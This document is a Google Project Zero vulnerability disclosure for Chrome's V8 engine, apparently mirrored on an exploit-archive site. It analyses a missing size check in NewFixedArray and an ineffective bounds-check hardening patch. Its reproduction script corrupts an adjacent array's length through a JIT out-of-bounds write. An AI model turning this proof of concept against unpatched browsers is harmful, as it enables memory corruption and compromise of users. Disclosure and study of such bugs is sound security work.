@@ -1,0 +1,155 @@
+id: 34865
+date: 08/25/2020
+title: Chrome NewFixedArray Missing Array Size Check Vulnerability
+author: Glazvunov
+cves: 
+
+Chrome: Missing array size check in NewFixedArray
+
+VULNERABILITY DETAILS
+V8 caps the number of elements a fixed array can contain[1]. Most of the code that needs to create
+or resize a fast JS array (i.e. one that's backed by a fixed array rather than a dictionary) ends up
+calling either the regular C++ function `AllocateRawFixedArray`[2] or its CSA equivalent
+`AllocateFixedArray`[3]. Both functions validate the length parameter and terminate the execution
+when the upper limit is exceeded.
+
+Recently, the same operation has been implemented in Torque. The newly introduced functions
+`NewFixedArray` and `NewFixedDoubleArray`, however, lack a similar length check:
+
+```
+macro NewFixedArray<Iterator: type>(length: intptr, it: Iterator): FixedArray {
+  if (length == 0) return kEmptyFixedArray;
+  return new
+  FixedArray{map: kFixedArrayMap, length: Convert<Smi>(length), objects: ...it};
+}
+
+macro NewFixedDoubleArray<Iterator: type>(
+    length: intptr, it: Iterator): FixedDoubleArray|EmptyFixedArray {
+  if (length == 0) return kEmptyFixedArray;
+  return new FixedDoubleArray{
+    map: kFixedDoubleArrayMap,
+    length: Convert<Smi>(length),
+    floats: ...it
+  };
+}
+```
+
+I've discovered two (indirect) users of `NewFixedArray` that can be abused to create an array with
+an invalid length. The first one is `ArrayPrototypeSplice`[5]. An attacker can call `splice` to add
+extra elements to a fast JS array that's just below the size limit. However, naively appending
+elements in a loop in order to obtain such an *enormous but still valid* array would fail and
+trigger an out-of-memory crash. A possible (and really quick) alternative is to merge a smaller
+array with itself several times:
+
+```
+array = Array(0x80000).fill(1);
+array.prop = 1;
+args = Array(0x100 - 1).fill(array);
+args.push(Array(0x80000 - 4).fill(2));
+giant_array = Array.prototype.concat.apply([], args);
+giant_array.splice(giant_array.length, 0, 3, 3, 3, 3);
+```
+
+Another function that transitively calls `NewFixedArray` is `RegExpPrototypeMatch`[6]. In this case,
+no preliminary array manipulation is required, although it's significantly slower:
+
+```
+giant_array = /a/g[Symbol.match]('a'.repeat(0x8000000));
+```
+
+The attacker can exploit this issue to confuse TurboFan's typer about the possible range of the
+length property of a fast JS array and use the confusion to bypass security checks, similarly to,
+for example, https://crbug.com/1051017. Unfortunately, the bounds check elimination technique from
+previous exploits is still viable due to a bug in one the hardening patches[7] for the typer:
+
+```
+Reduction TypedOptimization::ReduceMaybeGrowFastElements(Node* node) {
+[...]
+  if (!index_type.IsNone() && !length_type.IsNone() &&
+      index_type.Max() < length_type.Min()) {
+    Node* check_bounds = graph()->NewNode(
+        simplified()->CheckBounds(FeedbackSource{},
+                                  CheckBoundsFlag::kAbortOnOutOfBounds),
+        index, length, effect, control);
+    ReplaceWithValue(node, elements);
+    return Replace(check_bounds);
+  }
+
+  return NoChange();
+}
+```
+
+The patch adds a `CheckBounds` node to prevent OOB write access when the typer incorrectly assumes
+that a given array will never have to be extended. The problem is that the new node has no output
+edges: by the time `Replace` is called, the original node's effect edge has been already modified by
+`ReplaceWithValue`, and the value output from the `CheckBounds` node is never used. Therefore, the
+new node always gets eliminated in one of the subsequent optimization passes.
+
+There's also another `CheckBounds` node that verifies the array index is less than `length + 1024`,
+so the attacker has to employ the OOB access to overwrite data located relatively close to the
+array. A good candidate, which immediately presents a powerful exploitation primitive, is the length
+field of another fast array.
+
+---
+
+[1] - https://cs.chromium.org/chromium/src/v8/src/objects/fixed-array.h?rcl=5db4a28ef75f893e85b7f505f5528cc39e9deef5&l=172
+[2] - https://cs.chromium.org/chromium/src/v8/src/heap/factory-base.cc?rcl=5db4a28ef75f893e85b7f505f5528cc39e9deef5&l=732
+[3] - https://cs.chromium.org/chromium/src/v8/src/codegen/code-stub-assembler.cc?rcl=5db4a28ef75f893e85b7f505f5528cc39e9deef5&l=3805
+[4] - https://chromium.googlesource.com/v8/v8.git/+/bc0c25b4a0cd29d12bb5acb800b85dbb265580cb%5E%21/src/objects/fixed-array.tq
+[5] - https://cs.chromium.org/chromium/src/v8/src/builtins/array-splice.tq?rcl=2e7c4b6690947264ad147d23706e2a4cb2775b7e&l=358
+[6] - https://cs.chromium.org/chromium/src/v8/src/builtins/regexp-match.tq?rcl=2e7c4b6690947264ad147d23706e2a4cb2775b7e&l=144
+[7] - https://chromium.googlesource.com/v8/v8.git/+/c85aa83087e7146281a95369cadf943ef78bf321%5E%21/#F1
+
+
+REPRODUCTION CASE
+```
+<script>
+array = Array(0x40000).fill(1.1);
+args = Array(0x100 - 1).fill(array);
+args.push(Array(0x40000 - 4).fill(2.2));
+giant_array = Array.prototype.concat.apply([], args);
+giant_array.splice(giant_array.length, 0, 3.3, 3.3, 3.3);
+
+length_as_double =
+    new Float64Array(new BigUint64Array([0x2424242400000000n]).buffer)[0];
+
+function trigger(array) {
+  var x = array.length;
+  x -= 67108861;
+  x = Math.max(x, 0);
+  x *= 6;
+  x -= 5;
+  x = Math.max(x, 0);
+
+  let corrupting_array = [0.1, 0.1];
+  let corrupted_array = [0.1];
+
+  corrupting_array[x] = length_as_double;
+  return [corrupting_array, corrupted_array];
+}
+
+for (let i = 0; i < 30000; ++i) {
+  trigger(giant_array);
+}
+
+corrupted_array = trigger(giant_array)[1];
+alert('corrupted array length: ' + corrupted_array.length.toString(16));
+corrupted_array[0x123456];
+</script>
+```
+
+
+VERSION
+Google Chrome 83.0.4103.61 (Official Build)
+Chromium  85.0.4158.0 (Developer Build) (64-bit)
+
+
+CREDIT INFORMATION
+Sergei Glazunov of Google Project Zero
+
+
+This bug is subject to a 90 day disclosure deadline. After 90 days elapse, the bug report will
+become visible to the public. The scheduled disclosure date is 2020-08-25. Disclosure at an earlier
+date is possible if agreed upon by all parties.
+
+#  0day.today [2023-03-26]  #
